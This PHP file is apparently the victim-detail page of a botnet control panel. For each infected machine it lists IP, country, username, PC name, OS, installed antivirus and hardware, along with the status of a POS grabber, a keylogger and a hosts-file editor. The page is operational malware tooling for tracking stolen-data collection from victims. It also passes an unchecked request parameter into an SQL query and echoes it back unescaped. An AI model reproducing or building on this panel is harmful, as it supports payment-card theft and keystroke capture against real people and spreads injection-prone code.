<?php
error_reporting(0);
session_start();
require_once('session.php');

require_once('config.php');

$query_1 = mysql_query("SELECT COUNT(*) FROM clients ");
$query_1 = mysql_query("SELECT * FROM clients ORDER BY id DESC");
$eid     = $_GET['id'];
$id      = base64_decode($eid);
$data    = mysql_query("SELECT hid, ip, cc, time, userandpc, admin, os, hst, pos, ky, arc, user, fw, ram, cpu, gpu, hd, status FROM clients WHERE id='$id'");
$data_ok = mysql_fetch_array($data);

while ($row = mysql_fetch_array($query_1)) {
    $readable_date = date("j F Y, g:i a", $row['time']);
}

?>
	
<link rel="stylesheet" type="text/css" href="../css/log.css"/>

<div class="datagrid">
  <table>
    <thead>
      <tr>
        <th colspan="2" align="center">
          Full information for: <?=$data_ok["hid"]?>
        </th>
      </tr>
    </thead>
    
    <tbody>
      <tr>
        <td>
          <b>
            Hardware ID:
          </b>
        </td>
        <td>
          <?=$data_ok["hid"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            IP:
          </b>
        </td>
        <td>
          <?=$data_ok["ip"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            Country:
          </b>
        </td>
        <td>
          <?=$data_ok["cc"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            Username:
          </b>
        </td>
        <td>
          <?=$data_ok["user"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            PC Name:
          </b>
        </td>
        <td>
          <?=$data_ok["userandpc"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            Operative System:
          </b>
        </td>
        <td>
          <?=$data_ok["os"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            Antivirus:
          </b>
        </td>
        <td>
          <?=$data_ok["admin"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            Version:
          </b>
        </td>
        <td>
          <?=$data_ok["fw"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            OS Architecture:
          </b>
        </td>
        <td>
          <?=$data_ok["arc"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            RAM:
          </b>
        </td>
        <td>
          <?=$data_ok["ram"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            CPU:
          </b>
        </td>
        <td>
          <?=$data_ok["cpu"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            GPU:
          </b>
        </td>
        <td>
          <?=$data_ok["gpu"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            Hard Drive:
          </b>
        </td>
        <td>
          <?=$data_ok["hd"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            Host Editor:
          </b>
        </td>
        <td>
          <?=$data_ok["hst"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            POS Grabber:
          </b>
        </td>
        <td>
          <?=$data_ok["pos"]?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            Keyloger Status:
          </b>
        </td>
        <td>
          <?=$data_ok["ky"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            Last Check:
          </b>
        </td>
        <td>
          <?=$readable_date?>
        </td>
      </tr>
      
      <tr class="alt2">
        <td>
          <b>
            Status:
          </b>
        </td>
        <td>
          <?=$data_ok["status"]?>
        </td>
      </tr>
      
      <tr>
        <td>
          <b>
            Bot Number:
          </b>
        </td>
        <td>
          <?=base64_decode($_GET['id'])?>
        </td>
      </tr>
      
    </tbody>
  </table>
</div>